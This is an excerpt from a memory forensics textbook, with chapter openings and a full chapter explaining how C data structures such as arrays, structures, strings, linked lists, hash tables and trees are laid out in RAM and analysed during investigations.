# Introduction

Memory forensics is arguably the most fruitful, interesting, and provocative realm of digital forensics. Each function performed by an operating system or application results in specific modifications to the computer’s memory (RAM), which can often persist a long time after the action, essentially preserving them. Additionally, memory forensics provides unprecedented visibility into the runtime state of the system, such as which processes were running, open network connections, and recently executed commands. You can extract these artifacts in a manner that is completely independent of the system you are investigating, reducing the chance that malware or rootkits can interfere with your results. Critical data often exists exclusively in memory, such as disk encryption keys, memory-resident injected code fragments, off-the-record chat messages, unencrypted e-mail messages, and non-cacheable Internet history records.

By learning how to capture computer memory and profile its contents, you’ll add an invaluable resource to your incident response, malware analysis, and digital forensics capabilities. Although inspection of hard disks and network packet captures can yield compelling evidence, it is often the contents of RAM that enables the full reconstruction of events and provides the necessary puzzle pieces for determining what happened before, during, and after an infection by malware or an intrusion by advanced threat actors. For example, clues you find in memory ...
# I  
 An Introduction to Memory Forensics

- Chapter 1: Systems Overview
- Chapter 2: Data Structures
- Chapter 3: The Volatility Framework
- Chapter 4: Memory Acquisition
# Chapter 1 Systems Overview

This chapter provides a general overview of the hardware components and operating system structures that affect memory analysis. Although subsequent chapters discuss implementation details associated with particular operating systems, this chapter provides useful background information for those who are new to the field or might need a quick refresher. The chapter starts by highlighting important aspects of the hardware architecture and concludes by providing an overview of common operating system primitives. The concepts and terminology discussed in this chapter are referred to frequently throughout the remainder of the book.

## Digital Environment

This book focuses on investigating events that occur in a digital environment. Within the context of a digital environment, the underlying hardware ultimately dictates the constraints of what a particular system can do. In many ways, this is analogous to how the laws of physics constrain the physical environment. For example, physical crime scene investigators who understand the laws of physics concerning liquids can leverage bloodstains or splatter patterns to support or refute claims about a particular crime. By applying knowledge about the physical world, investigators gain insight into how or why a particular artifact is relevant to an investigation. Similarly, in the digital environment, the underlying hardware specifies the instructions that can be executed and the resources that can be accessed. Investigators ...
# Chapter 2  
 Data Structures

Understanding how data is organized within volatile storage is a critical aspect of memory analysis. Similar to files in file system analysis, data structures provide the template for interpreting the layout of the data. Data structures are the basic building blocks programmers use for implementing software and organizing how the program’s data is stored within memory. It is extremely important for you to have a basic understanding of the common data structures most frequently encountered and how those data structures are manifested within RAM. Leveraging this knowledge helps you to determine the most effective types of analysis techniques, to understand the associated limitations of those techniques, to recognize malicious data modifications, and to make inferences about previous operations that had been performed on the data. This chapter is not intended to provide an exhaustive exploration of data structures, but instead to help review concepts and terminology referred to frequently throughout the remainder of the book.

## Basic Data Types

You build data structures using the basic data types that a particular programming language provides. You use the basic data types to specify how a particular set of bits is utilized within a program. By specifying a data type, the programmer dictates the set of values that can be stored and the operations that can be performed on those values. These data types are referred to as the basic or primitive data types because they are not defined in terms of other data types within that language. In some programming languages, basic data types can map directly to the native hardware data types supported by the processor architecture. It is important to emphasize that basic data types frequently vary between programming languages, and their storage sizes can change depending on the underlying hardware.

### C Programming Language

This book primarily focuses on basic data types for the C programming language. Given its usefulness for systems programming and its facilities for directly managing memory allocations, C is frequently encountered when analyzing the memory-resident state of modern operating systems. [Table 2-1](#table2-1) shows basic data types for the C programming language and their common storage sizes for both 32-bit and 64-bit architectures.

---

**NOTE**

We have also included the `pointer` data type in [Table 2-1](#table2-1). A `pointer` is a value that stores a virtual memory address. Programs can declare a pointer to any type of data (i.e., `char`, `long`, or one of the abstract types discussed later). To access the stored data, you must de-reference the pointer, which requires virtual address translation. Thus, the inability to translate addresses will limit the types of analysis you can perform on a physical memory sample.

---

*[**Table 2-1**](#tableanchor2-1): Common Storage Sizes for C Basic Data Types*

|  |  |  |
| --- | --- | --- |
| **Type** | **32-Bit Storage Size (Bytes)** | **64-Bit Storage Size (Bytes)** |
| `char` | 1 | 1 |
| `unsigned char` | 1 | 1 |
| `signed char` | 1 | 1 |
| `int` | 4 | 4 |
| `unsigned int` | 4 | 4 |
| `short` | 2 | 2 |
| `unsigned short` | 2 | 2 |
| `long` | 4 | Windows: 4, Linux/Mac: 8 |
| `unsigned long` | 4 | Windows: 4, Linux/Mac: 8 |
| `long long` | 8 | 8 |
| `unsigned long long` | 8 | 8 |
| `float` | 4 | 4 |
| `double` | 8 | 8 |
| `pointer` | 4 | 8 |

The basic types in [Table 2-1](#table2-1) are those the C standard defines. They are used extensively for the Windows, Linux, and Mac OS X kernels. Windows also defines many of its own types based on these basic types that you can see throughout the Windows header files and documentation. [Table 2-2](#table2-2) describes several of these types.

*[**Table 2-2**](#tableanchor2-2): Common Storage Sizes for Some Windows Types*

|  |  |  |  |
| --- | --- | --- | --- |
| **Type** | **32-Bit Size (Bytes)** | **64-Bit Size (Bytes)** | **Purpose/Native Type** |
| `DWORD` | 4 | 4 | Unsigned long |
| `HMODULE` | 4 | 8 | Pointer/handle to a module |
| `FARPROC` | 4 | 8 | Pointer to a function |
| `LPSTR` | 4 | 8 | Pointer to a character string |
| `LPCWSTR` | 4 | 8 | Pointer to a Unicode string |

The compiler determines the actual size of the allocated storage for the basic data types, which is often dependent on the underlying hardware. It is important to keep in mind that most of the basic data types are multiple-byte values, and the endian order also depends on the underlying hardware processing the data. The following sections demonstrate examples of how the C programming language provides mechanisms for combining basic data types to form the composite data types used to implement data structures.

### Abstract Data Types

The discussion of specific data structure examples is prefaced by introducing the storage concepts in terms of abstract data types. Abstract data typesprovide models for both the data and the operations performed on the data. These models are independent of any particular programming language and are not concerned with the details of the particular data being stored.

While discussing these abstract data types, we will generically refer to the stored data as an element, which is used to represent an unspecified data type. This element could be either a basic data type or a composite data type. The values of some elements—pointers—may also be used to represent the connections between the elements. Analogous to the discussion of C pointers that store a memory address, the value of these elements is used to reference another element.

By initially discussing these concepts in terms of abstract data types, you can identify why you would use a particular data organization and how the stored data would be manipulated. Finally, we discuss examples of how the C programming language implements abstract data types as data structures and provide examples of how to use them within operating systems. You will frequently encounter implementations of data structures with which you may not be immediately familiar. By leveraging knowledge of how the program uses the data, the characteristics of how the data is stored in memory, and the conventions of the programming language, you can often recognize an abstract data-type pattern that will help give clues as to how the data can be processed.

### Arrays

The simplest mechanism for aggregating data is the one-dimensional array. This is a collection of `<index, element>` pairs, in which the elements are of a homogeneous data type. The data type of the stored elements is then typically referred to as the array type. An important characteristic of an array is that its size is fixed when an instance of the array is created, which subsequently bounds the number of elements that can be stored. You access the elements of an array by specifying an array index that maps to an element’s position within the collection. [Figure 2-1](#figure2-1) shows an example of a one-dimensional array.

![c02f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f001.png)

*[**Figure 2-1:**](#figureanchor2-1) One-dimensional array example*

In [Figure 2-1](#figure2-1), you have an example of an array that can hold five elements. This array is used to store characters and subsequently would be referred to as an array of characters. As a common convention you will see throughout the book, the first element of the array is found at index 0. Thus, the value of the element at index 2 is the C character. Assuming the array was given the name `grades`, we could also refer to this element as `grades[2]`.

Arrays are frequently used because many programming languages offer implementations designed to be extremely efficient for accessing stored data. For example, in the C programming language the storage requirements are a fixed size, and the compiler allocates a contiguous block of memory for storing the elements of the array. You typically reference the location of the array by the memory address of the first element, which is called the array’s base address. You can then access the subsequent elements of the array as an offset from the base address. For example, assuming that an array is stored at base address `X` and is storing elements of size `S`, you can calculate the address of the element at index `I` using the following equation:

Address(I) = X + (I * S)

This characteristic is typically referred to as random access because the time to access an element does not depend on what element you are accessing.

Because arrays are extremely efficient for accessing data, you encounter them frequently during memory analysis. This is especially true when analyzing the operating system’s data structures. In particular, the operating system commonly stores arrays of pointers and other types of fixed-sized elements that you need to access quickly at fixed indices. For example, in Chapter 21 you learn how Linux leverages an array to store the file handles associated with a process. In this case, the array index is the file descriptor number. Also, Chapter 13 shows Microsoft’s `MajorFunction` table: an array of function pointers that enable an application to communicate with a driver. Each element of the array contains the address of the code (dispatch routine) that executes to satisfy an I/O request. The index for the array maps to a predefined operation code (for example, 0 = read; 1 = write; 2 = delete).

[Figure 2-2](#figure2-2) provides an example of how the function pointers for a driver’s `MajorFunction` table are stored in memory on an IA32-based system, assuming that the first entry is stored at `base_address`.

![c02f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f002.png)

*[**Figure 2-2:**](#figureanchor2-2) Partial array of function pointers taken from a driver’s MajorFunction table*

If you know the base address of an array and the size of its elements, you can quickly enumerate the elements stored contiguously in memory. Furthermore, you can access any particular member by using the same calculations the compiler generates. You may also notice patterns in unknown contiguous blocks of memory that resemble an array, which can provide clues about how the data is being used, what is being stored, and how it can be interpreted.

### Bitmaps

An array variant used to represent sets is the bitmap, also known as the bit vector or bit array. In this instance, the index represents a fixed number of contiguous integers, and the elements store a boolean value {1,0}. Within memory analysis, bitmaps are typically used to efficiently determine whether a particular object belongs to a set (that is, allocated versus free memory, low versus high priority, and so on). They are stored as an array of bits, known as a map, and each bit represents whether one object is valid or not. Using bitmaps allows for representation of eight objects in one byte, which scales well to large data sets. For example, the Windows kernel uses a bitmap to maintain allocated network ports. Network ports are represented as an unsigned short, which is 2 bytes, and provides ((216)–1) or 65535 possibilities. This large number of ports is represented by a 65535-bit (approximately 8KB) bitmap. [Figure 2-3](#figure2-3) provides an example of this Windows structure.

![c02f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f003.png)

*[**Figure 2-3:**](#figureanchor2-3) An example of a Windows bitmap of in-use network ports*

The figure shows both the bit-level and byte-level view of the bitmap. In the byte-level view you can see that the first index has a value of 4e hexadecimal, which translates to 1001110 binary. This binary value indicates that ports 1, 2, 3, and 6 are in use, because those are the positions of the bits that are set.

### Records

Another mechanism commonly used for aggregating data is a record (or structure) type. Unlike an array that requires elements to consist of the same data type, a record can be made up of heterogeneous elements. It is composed of a collection of fields, where each field is specified by `<name, element>` pairs. Each field is also commonly referred to as a member of the record. Because records are static, similar to arrays, the combination of its elements and their order are fixed when an instance of the record is created. Specifying the particular member name, which acts as a key or index, accesses the elements of a record. A collection of elements can be combined within a record to create a new element. Similarly, it is also possible for an element of a record to be an array or record itself.

[Figure 2-4](#figure2-4) shows an example of a network connection record composed of four members that describe its characteristics: `id`, `port`, `addr`, and `hostname`. Despite the fact that the members may have a variety of data types and associated sizes, by forming a record you make it possible to store and organize related objects.

![c02f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f004.png)

*[**Figure 2-4:**](#figureanchor2-4) Network connection record example*

In the C programming language, records are implemented using structures. A structure enables a programmer to specify the name, type, and order of the members. Similar to arrays, the size of C structures is known when an instance is created, structures are stored in a contiguous block of memory, and the elements are accessed using a base plus offset calculation. The offsets from the base of a record vary depending on the size of the data types being stored. The compiler determines the offsets for accessing an element based on the size of the data types that precede it in the structure. For example, you would express the definition of a C structure for the network connection information from [Figure 2-4](#figure2-4) in the following format:

```
struct Connection { 
       short id;
       short port;
       unsigned long addr;
       char hostname[32];
};
```

As you can see, the identifier `Connection` is the structure’s name; and `id`, `port`, `addr`, and `hostname` are the names of its members. The first field of this structure is named `id`, which has a length of 2 bytes and is used to store a unique identifier associated with this record. The second field is named `port`, which also has a length of 2 bytes and is used to store the listening port on the remote machine. The third field is used to store the IP address of the remote machine as binary data in 4 bytes with a field name of `addr`. The fourth field is called `hostname` and stores the hostname of the remote machine using 32 bytes. Using information about the data types, the compiler can determine the proper offsets (0, 2, 4, and 8) for accessing each field. [Table 2-3](#table2-3) lists the members of `Connection` and their associated offsets.

*[**Table 2-3**](#tableanchor2-3): Structure Type Information for a Network Connection Example*

|  |  |  |  |
| --- | --- | --- | --- |
| **Byte Range** | **Name** | **Type** | **Description** |
| 0–1 | `id` | `short` | Unique record ID |
| 2–3 | `port` | `short` | Remote port |
| 4–7 | `addr` | `unsigned long` | Remote address |
| 8–39 | `hostname` | `char[32]` | Remote hostname |

The following is an example of how an instance of the data structure would appear in memory, as presented by a tool that reads raw data:

```
0000000: 0100 0050 ad3d de09 7777 772e 766f 6c61   ...P.>X.www.vola
0000010: 7469 6c69 7479 666f 756e 6461 7469 6f6e  tilityfoundation
0000020: 2e6f 7267 0000 0000                      .org....
```

C-style structures are some of the most important data structures encountered when performing memory analysis. After you have determined the base address of a particular structure, you can leverage the definition of the structure as a template for extracting and interpreting the elements of the record. One thing that you must keep in mind is that the compiler may add padding to certain fields of the structure stored in memory. The compiler does this to preserve the alignment of fields and enhance CPU performance.

As an example, we can modify the structure type from [Table 2-3](#table2-3) to remove the `port` field. If the program were then recompiled with a compiler configured to align on 32-bit boundaries, we would find the following data in memory:

```
0000000: 0100 0000 ad3d de09 7777 772e 766f 6c61   ...P.>X.www.vola
0000010: 7469 6c69 7479 666f 756e 6461 7469 6f6e  tilityfoundation
0000020: 2e6f 7267 0000 0000                      .org....
```

In the output, you can see that despite removing the `port` field, the remaining fields (`id`, `addr`, `hostname`) are still found at the same offsets (0, 4, 8) as before. You will also notice that the bytes 2–3 (containing 0000), which previously stored the port value, are now used solely for padding.

As you will see in later chapters, the definition of a data structure and the constraints associated with the values that can be stored in a field can also be used as a template for carving possible instances of the structure directly from memory.

### Strings

One of the most important storage concepts that you will frequently encounter is the string. The string is often considered a special case of an array, in which the stored elements are constrained to represent character codes taken from a predetermined character encoding. Similar to an array, a string is composed of a collection of `<index, element>` pairs. Programming languages often provide routines for string manipulation, which may change the mappings between indices and elements. While records and arrays are often treated as static data types, a string can contain a variable length sequence of elements that may not be known when an instance is created. Just as the mappings between indices and elements may change during processing, the size of the string may dynamically change as well. As a result, strings must provide a mechanism for determining the length of the stored collection.

The first implementation we are going to consider is the C-style string. C-style strings provide an implementation that is very similar to how the C programming language implements arrays. In particular, we will focus on C-style strings where the elements are of type `char`—a C basic data type—and are encoded using the ASCII character encoding. This encoding assigns a 7-bit numerical value (almost always stored in a full byte) to the characters in American English. The major difference between a C-style string and an array is that C-style strings implicitly maintain the string length. This is accomplished by demarcating the end of the string with an embedded string termination character. In the case of C-style strings, the termination character is the ASCII NULL symbol, which is `0x00`. You can then calculate the length of the string by determining the number of characters between the string’s starting address and the termination character.

For example, consider the data structure discussed previously for storing network information whose structure type was presented in [Table 2-3](#table2-3). The fourth element of the data structure used to store the hostname is a C-style string. [Figure 2-5](#figure2-5) shows how the string would be stored in memory using the ASCII character encoding. The string begins at byte offset 8 and continues until the termination character, `0x00`, at offset 36. Thus you can determine that the string is used to store 28 symbols and the termination character.

![c02f005.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f005.png)

*[**Figure 2-5:**](#figureanchor2-5) Hostname represented in ASCII as a C-style string*

You may frequently encounter an alternative string implementation when analyzing memory associated with the Microsoft Windows operating system. We will refer to this implementation as the `_UNICODE_STRING` implementation because that is the name of its supporting data structure. Unlike the C-style string implementation that leverages the ASCII character encoding to store 1-byte elements, the `_UNICODE_STRING` supports Unicode encoding by allowing elements to be larger than a single byte and, as a result, provides support for language symbols beyond just American English.

Unless otherwise specified, the elements of a `_UNICODE_STRING` are encoded using the UTF-16 version of Unicode. This means characters are stored as either 2- or 4-byte values. Another difference from the C-style string is that a `_UNICODE_STRING` does not require a terminating character but instead stores the length explicitly. As previously mentioned, a `_UNICODE_STRING` is implemented using a structure that stores the length, in bytes, of the string (`Length`), the maximum number of bytes that can be stored in this particular string (`MaximumLength`), and a pointer to the starting memory address in which the characters are stored (`Buffer`). The format of the `_UNICODE_STRING` data structure is given in [Table 2-4](#table2-4).

*[**Table 2-4**](#tableanchor2-4): Structure Type Definition for _UNICODE_STRING on 64-Bit Versions of Windows*

|  |  |  |  |
| --- | --- | --- | --- |
| **Byte Range** | **Name** | **Type** | **Description** |
| 0–1 | `Length` | `unsigned short` | Current string length |
| 2–3 | `MaximumLength` | `unsigned short` | Maximum string length |
| 8–15 | `Buffer` | `* unsigned short` | String address |

Strings are an extremely important component of memory analysis, because they are used to store textual data (passwords, process names, filenames, and so on). While investigating an incident, you will commonly search for and extract relevant strings from memory. In these cases, the string elements can provide important clues as to what the data is and how it is being used. In some circumstances, you can leverage where a string is found (relative to other strings) to provide context for an unknown region of memory. For example, if you find strings related to URLs and the temporary Internet files folder, you may have found fragments of the Internet history log file.

Also important for you to understand is that the particular implementation of the strings can pose challenges, depending on the type of memory analysis being performed. For example, because C-style strings implicitly embed a terminating character that designates the end of the stored characters, strings are typically extracted by processing each character until the termination character is reached. Some challenges may arise, if the termination character cannot be found. For example, when analyzing the physical address space of a system that leverages paged virtual memory, you could encounter a string that crosses a page boundary to a page that is no longer memory resident, which would require special processing or heuristics to determine the actual size of the string.

The `_UNICODE_STRING` implementation can also make physical address space analysis challenging. The `_UNICODE_STRING` data structure *only* contains metadata for the string (that is, its starting virtual memory address, size in bytes, and so on). Thus, if you cannot perform virtual address translation, then you cannot locate the actual contents of the string. Likewise, if you find the contents of a string through other means, you may not be able to determine its appropriate length, because the size metadata is stored separately.

### Linked Lists

A linked-list is an abstract data type commonly used for storing a collection of elements. Unlike fixed-size arrays and records, a linked-list is intended to provide a flexible structure. The structure can efficiently support dynamic updates and is unbounded with respect to the number of elements that it can store. Another major difference is that a linked-list is not indexed and is designed to provide sequential access instead of random access. A linked-list is intended to be more efficient for programs that need to frequently manipulate the stored collection by adding, removing, or rearranging elements. This added efficiency is accomplished by using links to denote relationships between elements and then updating those links as necessary. The first element of the list is commonly referred to as the head and the last element as the tail. Following the links from the head to the tail and counting the number of elements can determine the number of elements stored in a linked-list.

#### Singly Linked List

[Figure 2-6](#figure2-6) demonstrates an example of a singly-linked list of four elements. Each element of the singly linked list is connected by a single link to its neighbor and, as a result, the list can be traversed in only one direction. As shown in [Figure 2-6](#figure2-6), inserting new elements and deleting elements from the list requires only a couple of operations to update the links.

![c02f006.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f006.png)

*[**Figure 2-6:**](#figureanchor2-6) Singly-linked list example*

To support the dynamic characteristics of linked lists and minimize storage requirements, C programming language implementations typically allocate and deallocate the memory to store elements as needed. As a result, you cannot assume that the elements will be stored contiguously in memory. Furthermore, the sequential ordering of elements is not implicit with respect to their memory location, as was the case with arrays. Instead, each element of the list is stored separately, and links are maintained to the neighboring elements. In some implementations, the links are stored embedded within the element (internal storage). In other implementations, the nodes of the linked-list contain links to the neighboring nodes and a link to the address in memory where the element is being stored (external storage). In either case, you implement the links between nodes by using pointers that hold the virtual memory address of the neighboring node. Thus, to access an arbitrary element of the list, you must traverse the linked list by following the pointers sequentially through the virtual address space.

#### Doubly Linked List

It is also possible to create a doubly linked list in which each element stores two pointers: one to its predecessor in the sequence and the other to its successor. Thus, you can traverse a doubly linked list both forward and backward. As you will see in the forthcoming examples, linked-list implementations can also use a variety of mechanisms for denoting the head and tail of the list.

#### Circular Linked List

An example linked-list implementation used frequently in the Linux kernel is the circular linked list. It is called a circular linked list because the final link stored with the tail refers to the initial node in the list (list head). This is particularly useful for lists in which the ordering is not important. A circular linked list is traversed by starting at an arbitrary list node and stopping when the list traversal returns to that node. [Figure 2-7](#figure2-7) shows an example of a circular linked list. As discussed in more detail in later chapters, this type of linked list has been used in the Linux kernel for process accounting.

![c02f007.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f007.png)

*[**Figure 2-7:**](#figureanchor2-7) Circular linked list example*

#### Embedded Doubly Linked Lists

When analyzing process accounting for Microsoft Windows, you often encounter another linked-list implementation: an embedded doubly linked list. We refer to it as “embedded” because it leverages internal storage to embed a `_LIST_ENTRY64` data structure within the element being stored. As shown in the `_LIST_ENTRY64` format description in [Table 2-5](#table2-5), the data structure contains only two members: a pointer to the successor’s embedded `_LIST_ENTRY64` (`Flink`) and a pointer to the predecessor’s embedded `_LIST_ENTRY64` (`Blink`). Because the links store the addresses of other embedded `_LIST_ENTRY64` structures, you calculate the base address of the containing element by subtracting the offset of the embedded `_LIST_ENTRY64` structure within that element. Unlike the circular linked list, this implementation uses a separate `_LIST_ENTRY64` as a *sentinel node*, which is used only to demarcate where the list begins and ends. We discuss these and other linked-list implementations in more detail throughout the course of the book.

*[**Table 2-5**](#tableanchor2-5): Structure Type Definition _LIST_ENTRY64 on 64-Bit Versions of Windows*

|  |  |  |  |
| --- | --- | --- | --- |
| **Byte Range** | **Name** | **Type** | **Description** |
| 0–7 | Flink | `* _LIST_ENTRY64` | Pointer to successor |
| 8–15 | Blink | `* _LIST_ENTRY64` | Pointer to predecessor |

#### Lists in Physical and Virtual Memory

When analyzing memory, you frequently encounter a variety of linked-list implementations. For example, you can scan the physical address space looking for data that resembles the elements stored within a particular list. Unfortunately, you cannot determine whether the data you find is actually a *current* member of the list from physical address space analysis alone. You cannot determine an ordering for the list, nor can you use the stored links to find neighboring elements. On the other hand, physical address space analysis does enable you to potentially find elements that may have been deleted or surreptitiously removed to thwart analysis. Dynamic data structures, such as linked lists, are a frequent target of malicious modifications because they can be easily manipulated by simply updating a few links.

In addition to physical address space analysis, you can leverage virtual memory analysis to translate the virtual address pointers and traverse the links between nodes. Using virtual memory analysis, you can quickly enumerate relationships among list elements and extract important information about list ordering.

### Hash Tables

Hash tables are often used in circumstances that require efficient insertions and searches where the data being stored is in `<key, element>` pairs. For example, hash tables are used throughout operating systems to store information about active processes, network connections, mounted file systems, and cached files. A common implementation encountered during memory analysis involves hash tables composed of arrays of linked lists, otherwise known as *chained overflow hash tables*. The advantage of this implementation is that it allows the data structure to be more dynamic. A hash function, `h(x)`, is used to convert the key into an array index, and collisions (i.e., values with the same key) are stored within the linked list associated with the hash table entry. [Figure 2-8](#figure2-8) demonstrates an example of a hash table implemented as an array of linked lists.

![c02f008.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f008.png)

*[**Figure 2-8:**](#figureanchor2-8) Hash table with chained-overflow example*

In the example, searching for a particular key that results in a collision may require walking a linked list of collisions, but that is ideally much faster than walking through a list of all keys. For example, if a hash table is backed by an array of 16,000 indexes, and the hash table has 64,000 elements, an optimum hash function places 4 elements into each array index. When a search is performed, the hashed key then points to a list with only 4 elements instead of potentially traversing 64,000 elements upon each lookup.

Linux uses a chained overflow hash table (known as the *process ID hash table*) to associate process IDs with process structures. Chapter 21 explains how memory forensics tools leverage this hash table to find active processes.

### Trees

A tree is another dynamic storage concept that you may encounter when analyzing memory. Although arrays, records, strings, and linked lists provide convenient mechanisms for representing the sequential organization of data, a tree provides a more structured organization of data in memory. This added organization can be leveraged to dramatically increase the efficiency of operations performed on the stored data. As shown in later chapters, trees are used in operating systems when performance is critical. This section introduces basic terminology and concepts associated with hierarchical (rooted) trees, the class of trees most frequently encountered when analyzing memory.

#### Hierarchical Trees

Hierarchical trees are typically discussed in terms of family or genealogical trees. A hierarchical tree is composed of a set of nodes used to store elements and a set of links used to connect the nodes. Each node also has a key used for ordering the nodes. In the case of a hierarchical tree, one node is demarcated as the root, and the links between nodes represent the hierarchical structure through parent-child relationships. Links are used to connect a node (parent) to its children. As an example, a binary tree is a hierarchical tree in which each node is limited to no more than two children. A node that does not have any children (proper descendants) is referred to as a leaf. The only non-leaf (internal node) without a parent is the root. Any node in the tree and all its descendants form a subtree. A sequence of links that are combined to connect two nodes of the tree is referred to as a path between those nodes. A fundamental property of a hierarchical tree is that it does not possess any cycles. As a result, a unique path exists between any two nodes found in the tree. [Figure 2-9](#figure2-9) shows a simplified representation of a tree.

![c02f009.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c02/c02f009.png)

*[**Figure 2-9:**](#figureanchor2-9) A tree containing six nodes*

[Figure 2-9](#figure2-9) is an example of a binary tree containing six nodes that are used to store integers. In the case of binary trees, the links associated with each node are referred to as the left and right link, respectively. For the sake of simplicity, the key corresponds with the integer being stored, and each node is referenced using the key. The root of the tree is node 4; nodes 2 and 4 are internal nodes; and the leaf nodes are 1, 3, and 5. Combining the sequence of links between nodes 4, 2, and 3 is used to form the unique path from node 4 to node 3. Node 2 and its descendants, nodes 1 and 3, would be considered a subtree rooted at 2.

#### Tree Traversal

One of the most important operations to be performed on a tree, especially during memory analysis, is tree traversal, which is the process of visiting the nodes of a tree to extract a systematic ordering. Unlike the linked list abstract data type in which you traverse nodes by following the link to its neighbor, each node of a tree can potentially maintain links to multiple children. Thus an ordering is used to determine how the edges to the children should be processed. The different techniques are classified based on the order in which the nodes are visited. The three most frequently encountered orderings are preorder, inorder, and postorder. Each of the following descriptions is performed recursively at each node encountered. Using preorder traversal, you first visit the current node and then visit the subtrees from left to right. Inorder traversal involves visiting the left subtree, then the current node, and finally the remaining subtrees from left to right. During postorder traversal, you visit each subtree from left to right and then visit the current node. The following shows the preorder, inorder, and postorder orderings of the nodes.

```
___________________________

Preorder:  4, 2, 1, 3, 6, 5
Inorder:   1, 2, 3, 4, 5, 6
Postorder: 1, 3, 2, 5, 6, 4
___________________________
```

C-programming implementations of trees have many of the same characteristics as linked lists. The major differences are the number and types of links maintained between nodes and how those links are ordered. As in the linked list implementations, we will focus on trees in which the memory for the nodes of the tree is dynamically allocated and deallocated as needed. We will also primarily focus on explicit implementations that use internal storage to embed the links within the stored elements. These links are implemented as direct edges in which each node maintains pointers to the virtual memory addresses of related nodes.

#### Analyzing Trees in Memory

Analyzing trees in memory also shares similar challenges faced during the analysis of linked lists. For example, physical memory analysis offers the potential to find instances of stored or previously stored elements scattered throughout memory, but does not have the context to discern relationships between those elements. On the other hand, you can leverage virtual memory analysis to traverse the tree to extract node relationships and stored elements. In the case of an ordered tree, if you know the traversal order or can discern it from the field names, you can extract the ordered list of elements. By combining the overall structure of the tree with the ordering criteria, you may even be able to discern information about how the elements were inserted or removed from the tree as it evolved over time.

This book highlights many different variants of trees and how they are used within operating systems. For example, the Windows memory manager uses a virtual address descriptor (VAD) tree to provide efficient lookups of the memory ranges used by a process. The VAD tree is an example of a *self-balancing binary tree* that uses the memory address range as the key. Intuitively, this means that nodes containing lower memory address ranges are found in a node’s left subtree, and nodes containing higher ranges are found in the right subtree. As you will see in Chapter 7, using these pointers and an inorder traversal method, you can extract an ordered list of the memory ranges that describes the status of the process’s virtual address space.

## Summary

Data structures play a critical role in memory analysis. At the most fundamental level, they help us make sense of the otherwise arbitrary bytes in a physical memory dump. By understanding relationships among the data (i.e., nodes within a tree, elements of a list, characters of a string), you can begin to build a more accurate and complete representation of the evidence. Furthermore, knowledge of an operating system’s specific implementation of an abstract data structure is paramount to learning why certain attacks (that manipulate the structure(s)) are successful and how memory analysis tools can help you detect such attacks.
# Chapter 3 The Volatility Framework

The Volatility Framework is a completely open collection of tools, implemented in Python under the GNU General Public License 2. Analysts use Volatility for the extraction of digital artifacts from volatile memory (RAM) samples. Because Volatility is open source and free to use, you can download the framework and begin performing advanced analysis without paying a penny. Furthermore, when it comes down to understanding how your tool works beneath the hood, nothing stands between you and the source code—you can explore and learn to your fullest potential.

This chapter covers the basic information you need to install Volatility, configure your environment, and work with the analysis plugins. It also introduces you to the benefits of using Volatility and describes some of the internal components that make the tool a true framework. Also, keep in mind that software evolves over time. Thus, the framework’s capabilities, plugins, installation considerations, and other factors may change in the future.

## Why Volatility?

Before you start using Volatility, you should understand some of its unique features. As previously mentioned, Volatility is not the only memory forensics application—it was specifically designed to be different. Here are some of the reasons why it quickly became our tool of choice:

- **A single, cohesive framework.** Volatility analyzes memory from 32- and 64-bit Windows, Linux, Mac systems (and 32-bit Android). Volatility’s modular design ...
# Chapter 4 Memory Acquisition

Memory acquisition (i.e., capturing, dumping*,* sampling) involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process. Unfortunately, many analysts blindly trust acquisition tools without stopping to consider how those tools work or the types of problems they might encounter. As a result, they end up with corrupt memory images, destroyed evidence, and limited, if any, analysis capabilities. Although this chapter focuses on Windows memory acquisition, many of the concepts apply to other operating systems. You’ll also find Linux and Mac OS X–specific discussions in their respective chapters.

## Preserving the Digital Environment

Although the main focus of this book is analyzing the data stored in volatile memory, the success of that analysis often depends at the outset on the acquisition phase of the investigation. During this phase, the investigator must make important decisions about which data to collect and the best method for collecting that data. Fundamentally, memory acquisition is the procedure of copying the contents of physical memory to another storage device for preservation. This chapter highlights the important issues associated with accessing the data stored in physical memory and the considerations associated with writing the data to its destination. The particular methods and tools you use often depends on the goals of the investigation ...
# II  
 Windows Memory Forensics

- Chapter 5: Windows Objects and Pool Allocations
- Chapter 6: Processes, Handles, and Tokens
- Chapter 7: Process Memory Internals
- Chapter 8: Hunting Malware in Process Memory
- Chapter 9: Event Logs
- Chapter 10: Registry in Memory
- Chapter 11: Networking
- Chapter 12: Services
- Chapter 13: Kernel Forensics and Rootkits
- Chapter 14: Windows GUI Subsystem, Part I
- Chapter 15: Windows GUI Subsystem, Part II
- Chapter 16: Disk Artifacts in Memory
- Chapter 17: Event Reconstruction
- Chapter 18: Timelining
# Chapter 5 Windows Objects and Pool Allocations

All the artifacts that you find in memory dumps share a common origin: They all start out as an allocation. How, when, and why the memory regions were allocated sets them apart, in addition to the actual data stored within and around them. From a memory forensics perspective, studying these characteristics can help you make inferences about the content of an allocation, leading to your ability to find and label specific types of data throughout a large memory dump. Furthermore, becoming familiar with the operating system’s algorithms for allocation and de-allocation of memory can help you understand the context of data when you find it—for example, whether it is currently in use or marked as free.

This chapter introduces you to the concepts of Windows executive objects, kernel pool allocations, and pool tag scanning. Specifically, you will use this knowledge to find objects (such as processes, files, and drivers) by using a method that is independent of how the operating system enumerates the objects. Thus, you can defeat rootkits that try to hide by manipulating the operating system’s internal data structures. Furthermore, you can identify objects that were used but have since been discarded (but not overwritten), giving you valuable insight into events that occurred in the past.

## Windows Executive Objects

A great deal of memory forensics involves finding and analyzing executive objects. In Chapter 2, you learned that Windows is ...
# Chapter 6  
 Processes, Handles, and Tokens

